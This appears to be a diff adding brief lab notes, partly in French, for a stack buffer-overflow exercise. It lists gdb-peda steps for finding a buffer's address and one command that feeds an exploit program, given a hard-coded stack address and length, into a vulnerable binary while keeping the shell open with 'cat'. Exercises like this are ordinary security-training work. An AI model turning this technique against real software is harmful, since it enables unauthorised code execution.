@@ -1,0 +1,7 @@
+gdb-peda vulnerable
+b entry
+r
+p &buffer -->  donne l'addresse du buffer
+
+
+exploit : (./exploit3 0xbffffa5c 524; cat) | ./vulnerable
